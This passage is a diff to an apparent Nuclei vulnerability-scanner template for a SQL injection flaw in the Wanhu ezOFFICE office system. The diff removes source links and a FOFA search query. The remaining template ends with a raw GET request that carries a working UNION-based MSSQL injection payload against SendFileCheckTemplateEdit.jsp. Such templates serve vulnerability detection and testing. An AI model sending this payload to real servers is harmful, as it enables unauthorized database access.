@@ -3,14 +3,8 @@ info:
   name: 万户 ezOFFICE SendFileCheckTemplateEdit.jsp存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kt7xpywsps6fxocr
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kt7xpywsps6fxocr
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;?RecordID=1''%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
